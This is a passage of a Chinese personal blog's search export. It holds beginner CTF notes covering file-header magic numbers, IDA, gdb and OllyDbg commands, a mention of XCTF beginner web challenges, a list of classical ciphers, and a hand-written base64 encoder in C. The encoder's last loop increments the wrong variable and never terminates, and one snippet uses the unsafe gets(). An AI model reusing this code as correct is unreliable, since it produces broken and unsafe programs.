文件头：41433130　　　　　文件尾：<br>Windows Shortcut (lnk)        文件头：4C000000<br>Windows reg, (reg)                    文件头：5245474544495434<br>上面也不是都的记，记住几个常用的就行。</p><h1 id="Notepad"><a href="#Notepad" class="headerlink" title="Notepad++"></a>Notepad++</h1><p>这个怎么说，最好装上去，因为有时候用这个要比记事本方便好多，有时候可能要添加或修改一些东西，用它是可以的，二笔记本有时候改了但文件还没改，所以要用到这个。这个虽然功能不大，但有时会用到</p><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%">  <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1451109198&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新手web&amp;reverse1</title>
      <link href="posts/f32144c2/"/>
      <url>posts/f32144c2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="这里主要是说IDA-pro和BurpSuite这两个软件，一个逆向一个web（哈哈）小白一个，大佬别介意"><a href="#这里主要是说IDA-pro和BurpSuite这两个软件，一个逆向一个web（哈哈）小白一个，大佬别介意" class="headerlink" title="这里主要是说IDA pro和BurpSuite这两个软件，一个逆向一个web（哈哈）小白一个，大佬别介意"></a>这里主要是说IDA pro和BurpSuite这两个软件，一个逆向一个web（哈哈）小白一个，大佬别介意</h2><font color=#999AAA ><p>这里主要说一下ida，因为最近逆向做的多一点，刚开始直接托进ida，Shitf+F12查看字符串，Ctrl+x跳转到视图中，然后F5看伪代码，就这了。<br>其实我感觉主要是C要好一点，因为要分析它，然后用Python（其它的也行）编个脚本做出来。现在突然发现也没啥要讲的，<br>因为一顿操作，然后能做就做，不能就撤（哈哈）。苦笑，另加个操作Shift+e是可以整理数据的（很方便的）</p><p>讲讲快捷键，r可以将伪代码的一些数字转换为字符，右键第一个选项可以还原它；在汇编中用快捷键d可以将其转换成数据，快捷键c可以将其转换成代码，；这个键可以添加注释。右键的Remove可以重命名（方便我们理解）还有个自动注释功能Auto comments；</p><p>ida中有交叉引用，就是将一条指令的控制权转交给另一条指令。ida可以说是目前最强大的反编译工具了。</p><p>还有一些调试器工具，如Ollydbg，gdb.<br>先说说gdb：<br>gdb内部命令(调试)：</p><table><thead><tr><th>命令</th><th align="center">描述</th></tr></thead><tbody><tr><td>file [filename]</td><td align="center">装入想要调试的可执行文件</td></tr><tr><td>kill [filename]</td><td align="center">终止正在调试的程序</td></tr><tr><td>break [file:]function</td><td align="center">在(file文件的)function函数中设置一个断点</td></tr><tr><td>clear</td><td align="center">删除一个断点&#xff0c;这个命令需要指定代码行或者函数名作为参数</td></tr><tr><td>run [arglist]</td><td align="center">运行您的程序 (如果指定了arglist,则将arglist作为参数运行程序)</td></tr><tr><td>bt</td><td align="center">Backtrace: 显示程序堆栈信息</td></tr><tr><td>print expr</td><td align="center">打印表达式的值</td></tr><tr><td>continue</td><td align="center">继续运行您的程序 (在停止之后&#xff0c;比如在一个断点之后)</td></tr><tr><td>list</td><td align="center">列出产生执行文件的源代码的一部分</td></tr><tr><td>next</td><td align="center">单步执行 (在停止之后); 跳过函数调用</td></tr><tr><td>nexti</td><td align="center">执行下一行的源代码中的一条汇编指令</td></tr><tr><td>set</td><td align="center">设置变量的值。例如&#xff1a;set nval&#61;54 将把54保存到nval变量中</td></tr><tr><td>step</td><td align="center">单步执行 (在停止之后); 进入函数调用</td></tr><tr><td>stepi</td><td align="center">继续执行程序下一行源代码中的汇编指令。如果是函数调用&#xff0c;这个命令将进入函数的内部&#xff0c;单步执行函数中的汇编代码</td></tr><tr><td>watch</td><td align="center">使你能监视一个变量的值而不管它何时被改变</td></tr><tr><td>rwatch</td><td align="center">指定一个变量&#xff0c;如果这个变量被读&#xff0c;则暂停程序运行&#xff0c;在调试器中显示信息&#xff0c;并等待下一个调试命令。参考rwatch和watch命令</td></tr><tr><td>awatch</td><td align="center">指定一个变量&#xff0c;如果这个变量被读或者被写&#xff0c;则暂停程序运行&#xff0c;在调试器中显示信息&#xff0c;并等待下一个调试命令。参考rwatch和watch命令</td></tr><tr><td>Ctrl-C</td><td align="center">在当前位置停止执行正在执行的程序&#xff0c;断点在当前行</td></tr><tr><td>disable</td><td align="center">禁止断点功能&#xff0c;这个命令需要禁止的断点在断点列表索引值作为参数</td></tr><tr><td>display</td><td align="center">在断点的停止的地方&#xff0c;显示指定的表达式的值。(显示变量)</td></tr><tr><td>undisplay</td><td align="center">删除一个display设置的变量显示。这个命令需要将display list中的索引做参数</td></tr><tr><td>enable</td><td align="center">允许断点功能&#xff0c;这个命令需要允许的断点在断点列表索引值作为参数</td></tr><tr><td>finish</td><td align="center">继续执行&#xff0c;直到当前函数返回</td></tr><tr><td>ignore</td><td align="center">忽略某个断点制定的次数。例&#xff1a;ignore 4 23 忽略断点4的23次运行&#xff0c;在第24次的时候中断</td></tr><tr><td>info [name]</td><td align="center">查看name信息</td></tr><tr><td>load</td><td align="center">动态载入一个可执行文件到调试器</td></tr><tr><td>xbreak</td><td align="center">在当前函数的退出的点上设置一个断点</td></tr><tr><td>whatis</td><td align="center">显示变量的值和类型</td></tr><tr><td>ptype</td><td align="center">显示变量的类型</td></tr><tr><td>return</td><td align="center">强制从当前函数返回</td></tr><tr><td>txbreak</td><td align="center">在当前函数的退出的点上设置一个临时的断点(只可使用一次)</td></tr><tr><td>make</td><td align="center">使你能不退出 gdb 就可以重新产生可执行文件</td></tr><tr><td>shell</td><td align="center">使你能不离开 gdb 就执行 UNIX shell 命令</td></tr><tr><td>help [name]</td><td align="center">显示GDB命令的信息&#xff0c;或者显示如何使用GDB的总体信息</td></tr><tr><td>quit</td><td align="center">退出gdb</td></tr></tbody></table> <p>设置断点(BreakPoint)：</p><table><thead><tr><th>参数</th><th align="center">描述</th></tr></thead><tbody><tr><td>break </td><td align="center">在进入指定函数时停住。C&#43;&#43;中可以使用class::function或function(type,type)格式来指定函数名</td></tr><tr><td>break </td><td align="center">在指定行号停住</td></tr><tr><td>break &#43;offset和beak -offset</td><td align="center">在当前行号的前面或后面的offset行停住。offiset为自然数</td></tr><tr><td>break filename:linenum</td><td align="center">在源文件filename的linenum行处停住</td></tr><tr><td>break filename:function</td><td align="center">在源文件filename的function函数的入口处停住</td></tr><tr><td>break *address</td><td align="center">在程序运行的内存地址处停住</td></tr><tr><td>break</td><td align="center">该命令没有参数时&#xff0c;表示在下一条指令处停住</td></tr><tr><td>break … if </td><td align="center">condition表示条件&#xff0c;在条件成立时停住。比如在循环体中&#xff0c;可以设置break if i&#61;100&#xff0c;表示当i为100时停住程序</td></tr></tbody></table> <p>设置观察点(WatchPoint)</p><table><thead><tr><th>参数</th><th align="center">描述</th></tr></thead><tbody><tr><td>watch </td><td align="center">为表达式(变量)expr设置一个观察点。一旦表达式值有变化时&#xff0c;马上停住程序</td></tr><tr><td>rwatch </td><td align="center">当表达式(变量)expr被读时&#xff0c;停住程序</td></tr><tr><td>awatch </td><td align="center">当表达式(变量)的值被读或被写时&#xff0c;停住程序</td></tr><tr><td>info watchpoints</td><td align="center">列出当前设置的所有观察点</td></tr></tbody></table> <h2 id="进入gdb调试环境">进入gdb调试环境</h2> <hr /> <blockquote>  <p>list n | list | list 函数名 <br /> l n | l | l 函数名</p> </blockquote> <p>在调试过程中查看源文件&#xff0c;n为源文件的行号&#xff0c;每次显示10行。 <br /> list可以简写为l&#xff0c;不带任何参数的l表示从当前执行行查看。</p> <blockquote>  <p>注意&#xff1a;在(gdb)中直接回车&#xff0c;表示执行上一条命令。</p>  <p>start | s</p> </blockquote> <p>开始执行程序&#xff0c;并main函数的停在第一条语句处。</p> <blockquote>  <p>(gdb)run|r</p> </blockquote> <p>连续执行程序&#xff0c;直到遇到断点</p> <blockquote>  <p>(gdb)continue|c</p> </blockquote> <p>继续执行程序&#xff0c;直到下个断点</p> <blockquote>  <p>(gdb)next|n</p> </blockquote> <p>执行下一行语句</p> <blockquote>  <p>(gdb)step|s</p> </blockquote> <p>进入正在执行的函数内部</p> <blockquote>  <p>(gdb)finish</p> </blockquote> <p>一直执行到当前函数返回&#xff0c;即跳出当前函数&#xff0c;执行其调用函数</p> <h2 id="变量信息管理">变量信息管理</h2> <hr /> <blockquote>  <p>(gdb)info 变量名|i 变量名|i locals</p> </blockquote> <p>i变量名查看一个变量的值&#xff0c;i locals查看所有局部变量的值 <br /> 修改变量的值</p> <blockquote>  <p>(gdb)set var 变量名&#61;变量值</p>  <p>(gdb) print 表达式</p> </blockquote> <p>打印表达式&#xff0c;通过表达式可以修改变量的值&#xff0c;p 变量名&#61;变量值</p> <blockquote>  <p>(gdb)display 变量名</p> </blockquote> <p>使得程序每次停下来都会显示变量的值</p> <p>x/nbx 变量名</p> <p>查看从变量名开始的n个字节,例x/7bx input 表示查看从变量input开始的7个内存单元的内容</p> <h2 id="查看函数调用栈">查看函数调用栈</h2> <hr /> <blockquote>  <p>(gdb)backtrace|bt</p> </blockquote> <p>查看其调用函数的信息</p> <blockquote>  <p>(gdb)frame n|f n</p> </blockquote> <p>n为栈的层次&#xff0c;然后可以用其他命令&#xff08;info&#xff09;查看此级别的变量信息</p> <h2 id="断点管理">断点管理</h2> <hr /> <p>设置断点</p> <blockquote>  <p>break n|break 函数名|b n| b 函数名|b n(函数名&#xff09;if 条件</p> </blockquote> <p>n为行号&#xff0c;添加if表示设置条件断点&#xff0c;只有条件为真时&#xff0c;才中断</p> <p>查看断点</p> <blockquote>  <p>info breakpoints|i breakpoints</p> </blockquote> <p>删除断点</p> <blockquote>  <p>delete breakpoints n</p> </blockquote> <p>使断点失效</p> <blockquote>  <p>disable breakpoints n</p> </blockquote> <p>使断点生效</p> <blockquote>  <p>enable breakpoints n <br /> 其中n为断点的序列号&#xff0c;可以用info breakpoints查看</p> </blockquote> <h2 id="观察点管理">观察点管理</h2> <hr /> <p>断点是程序执行到某行代码是触发&#xff0c;观察点是程序访问某个内存单元时触发</p> <blockquote>  <p>(gdb)watch 变量名</p> </blockquote> <p>当程序访问变量名指定的内存单元时&#xff0c;停止程序</p> <blockquote>  <p>info watchpoints|delete watchpoints <br /> 类似断点管理</p> </blockquote> <h2 id="退出gdb环境">退出gdb环境</h2> <hr /> <blockquote>  <p>(gdb)quit | q</p> </blockquote><p>那现在看看ollydbg（OD）的方法吧！<br>其实也没什么要说的，它不像dbg一样有许多命令。就有几个快捷键，主要的是要会找到我们想要的代码（定位代码最关键）<br>进去靠着搜索字符串定位，或着打开ida辅助定位。<br>F7 执行一行代码，遇到 CALL 等子程序时会进入其中，进入后首先会停留在子程序的第一条 指令上。<br>F8 执行一行代码，遇到 CALL 等子程序不进入其代码。<br>F2 在显著行设置断点，再次按 F2 删除断点。<br>然后再讲些基础知识（寄存器）：<br>EAX 是”累加器”(accumulator), 它是很多加法乘法指令的缺省寄存器。<br>EBX 是”基地址”(base)寄存器, 在内存寻址时存放基地址。<br>ECX 是计数器(counter), 是重复(REP)前缀指令和LOOP指令的内定计数器。<br>EDX 则总是被用来放整数除法产生的余数。<br>ESI/EDI分别叫做”源/目标索引寄存器”(source/destination index),因为在很多字符串操作指令中, DS:ESI指向源串,而ES:EDI指向目标串。<br>EBP是”基址指针”(BASE POINTER), 它最经常被用作高级语言函数调用的”框架指针”(frame pointer)。</p><p>说的有点多，下面简要说说web，来来来，看看我们的web，就着题来讲，xctf的新手web题主要是一题一个知识点，不同于reserve（逆向主要还是要会分析，并对应的写出脚本）像view_source这道题就是让我们熟悉一下web，知道web是个啥。robots与backup与cookie就是在网址上加点东西（就是熟悉下web不止是个网页，它背后还有许多其它的东西）就出答案了。<br>simple_php这道题涉及到来后端的一点东西，它让我们去了解这些。disabled_button这个是让我们修改源代码，（让我们了解怎么去修改，又要掌握那些知识）其它的其实我也没怎么接触。先写篇博客（是为了怕我忘记，多做题积累经验，写博客就是将题目再复述一遍）。当然，我们不止要复述一遍，甚至七八遍都不为过，它也不会浪费多大时间，每复述一遍速度都会提升，所以不用担心浪费时间。我感觉这种学习是很棒的。<br>web的一些题是会用到一些插件，Max HacKBar（HacKBar）这个php的post会用到；Proxy Switcher这个是抓包会用到的一个插件。<br>其实很多题解都不在我的博客上写（而是在csdn上写的），其实题解是代表我的一种思路罢，我的博客写的是一些工具的感悟和使用吧！<br>授人以鱼不如授人以渔</p><p>愿诸君共勉。</p><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%">  <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1481376310&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一篇的博客</title>
      <link href="posts/a379fde7/"/>
      <url>posts/a379fde7/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><font color=#999AAA ></font><p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p><hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><h1 id="论密码1·第一次博客"><a href="#论密码1·第一次博客" class="headerlink" title="论密码1·第一次博客"></a>论密码1·第一次博客</h1><p><font color=#999AAA >        学习以来第一次写博客！可能不好，多多见谅！<br>    刚开始接触Crypto，其它的还没怎么去了解。<br>        总结下目前我碰到的所有密码之类的：像base64<br>    ，base32，base16等是比较简单的，这都是一类的<br>    密码，我们一般会碰到base64，而base32、16基<br>    本碰不到，因为base64的复杂程度要高一点。</font></p><hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><font color=#999AAA ><h6 id="密码："><a href="#密码：" class="headerlink" title="密码："></a>密码：</h6><p><font color=#999AAA >其实base64就和ASCLL码一样，用6位的二进制里面的不同的值来表示不同的字符，这样与ASCLL码进行相互联系。</p><p>还有凯撒密码，它就是字母间的位移，位移几位后便是加密后的。</p><p>栅栏密码，这个解释起来有点难，它就是将一串字符相互分组然后来拼接的。</p><p>morse code（摩斯密码）我们都听过吧，就是几个—和几个. 结合来代表某个符号，一一比对就可得出原文。</p><p>培根密码，又名倍康尼密码（英语：Bacon’s cipher）是由法兰西斯·培根发明的一种隐写术。就是两个不同的符号每五个组成来代表一个字母。</p><p>还有个Brainfuck/Ook！编码，这个全是Ook编的，唯一不同的是后面的标点符号</p><p>维吉尼亚密码，就是有一个表格，和一个的密钥，将要加密的字符通2过这些来进行加密</p><p>ROT5，ROT13，ROT18，ROT47这与base一样，是不同系列的密码，它们也是凯撒加密的一种变体。</p><p>rabbit加密，就是麻辣兔头，发现了点不同，就是百度百科上没有这条词，暂时没有发现它的加密原理。</p><p>jother加密，就是种编码，有点新奇！<br>类似的还有与佛论禅这种加密等等。</p><p>猪圈密码（亦称朱高密码、共济会暗号、共济会密码或共济会员密码），在丹·布朗《失落的秘符》书中曾提到，但此密码为幼儿级水平，易破解。不过需要对照表。</p><p>当铺密码，是一种将汉字笔画与数字联系在一起的加密方式</p><p>unicode编码，它和ascll码一样，都是将字符对应二进制的数，唯一不同的是，它收集了全世界的字符。</p><p>URL编码，也能作为加密的一种手段。<br>还有一些其它的编码，如跳舞的小人，QWE加密等等，目前接触不多，哈哈，望各位大佬指点。</p><h1 id="ctf之密码初尝试"><a href="#ctf之密码初尝试" class="headerlink" title="ctf之密码初尝试"></a>ctf之密码初尝试</h1><h2 id=""><a href="#" class="headerlink" title=""></a></h2><font color=#999AAA ><p>刚开始的密码类的题还是比较简单的，根据它的提示，到百度上能找到解密的在线工具，然后傻瓜粘贴复制，就找到了flag。</p><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><pre><code>其实也没什么思路，因为刚开始都比较简单，难一点的题还没碰到，就是简单的查找在线工具，然后基本就解密完成了，还没碰到多重加密的题。</code></pre><font color=#999AAA ><p>望各位大佬保佑小弟，让小弟更上一层楼。<br>同时希望我可以自己搭出博客！！！<br>大佬保佑。</p><font color=#999AAA ><hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="附："><a href="#附：" class="headerlink" title="附："></a>附：</h2><font color=#999AAA ><p>base64用C语言简单实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> base64[<span class="number">64</span>] = &#123;<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;h&#x27;</span></span><br><span class="line">        ,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;/&#x27;</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> t,i=<span class="number">0</span>,j,k=<span class="number">0</span>,l=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> n=<span class="number">0</span>,m=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">1000</span>],b[<span class="number">1000</span>],c[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">while</span>(t=getchar())&#123;<span class="comment">//输入并将其转换为十进制贮存 </span></span><br><span class="line">a[i]=t;</span><br><span class="line"><span class="keyword">if</span>(a[i]==<span class="number">10</span>)&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(i)&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">7</span>;j&gt;=<span class="number">0</span>;j--)&#123;<span class="comment">//转换八位数的二进制</span></span><br><span class="line"><span class="keyword">if</span>(a[k]==<span class="number">0</span>)&#123;</span><br><span class="line">c[j]=<span class="number">0</span>;<span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">t=a[k]%<span class="number">2</span>;a[k]=a[k]/<span class="number">2</span>;</span><br><span class="line">c[j]=t;</span><br><span class="line">&#125;k++;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">8</span>;j++)&#123;<span class="comment">//贮存在数组中</span></span><br><span class="line">b[l]=c[j];l++;</span><br><span class="line">&#125;i--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*for(i=0;i&lt;l;i++)&#123;//测试 </span></span><br><span class="line"><span class="comment">printf(&quot;%d&quot;,b[i]);</span></span><br><span class="line"><span class="comment">&#125;*/</span> </span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;<span class="comment">//补齐数 </span></span><br><span class="line"><span class="keyword">if</span>(l%<span class="number">6</span>==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">b[l]=<span class="number">0</span>;l++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*for(i=0;i&lt;l;i++)&#123;//测试    看一下我的的数组是否补全了数 </span></span><br><span class="line"><span class="comment">printf(&quot;%d&quot;,b[i]);</span></span><br><span class="line"><span class="comment">&#125;*/</span> </span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=l;l++)&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">5</span>;j&gt;=<span class="number">0</span>;j--)&#123;</span><br><span class="line">n=n+b[m]*<span class="built_in">pow</span>(<span class="number">2</span>,j);m++;</span><br><span class="line">&#125;<span class="comment">//printf(&quot;%d\n&quot;,n);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,base64[n]);</span><br><span class="line">n=<span class="number">0</span>;<span class="comment">//最后记得加上这条语句</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%">  <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1307822772&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hello word</title>
      <link href="posts/26ca43fa/"/>
      <url>posts/26ca43fa/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Hello World!!!</p><h2 id="你好，世界"><a href="#你好，世界" class="headerlink" title="你好，世界"></a>你好，世界</h2><h3 id="开始自己的生活吧！"><a href="#开始自己的生活吧！" class="headerlink" title="开始自己的生活吧！"></a>开始自己的生活吧！</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello World&quot;</span>);<span class="comment">//打个招呼</span></span><br></pre></td></tr></table></figure><p>CSDN: <a href="https://www.csdn.net/">来点我呀!</a></p><h3 id="来，开始我们的博客生活吧"><a href="#来，开始我们的博客生活吧" class="headerlink" title="来，开始我们的博客生活吧"></a>来，开始我们的博客生活吧</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gets(a);</span><br></pre></td></tr></table></figure><p>中国大学MOOC: <a href="https://www.icourse163.org/">你敢点我吗？</a></p><h3 id="看看我们右下角的小伙伴"><a href="#看看我们右下角的小伙伴" class="headerlink" title="看看我们右下角的小伙伴"></a>看看我们右下角的小伙伴</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;6&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞银行: <a href="https://www.bugbank.cn/">来呀！学习呀！</a></p><h3 id="到这些网站去学习吧！！！"><a href="#到这些网站去学习吧！！！" class="headerlink" title="到这些网站去学习吧！！！"></a>到这些网站去学习吧！！！</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;你来呀！！！&quot;</span>)；</span><br></pre></td></tr></table></figure><p>慕课网: <a href="https://www.imooc.com/new/">好多学习资源啊！！！</a></p><div style="position:abolute; bottom:100px; left:0px; width:50%">  <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=31445554&auto=1&height=66"></iframe> </div><!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>大学感想</title>
      <link href="posts/4aa020cb/"/>
      <url>posts/4aa020cb/</url>
      
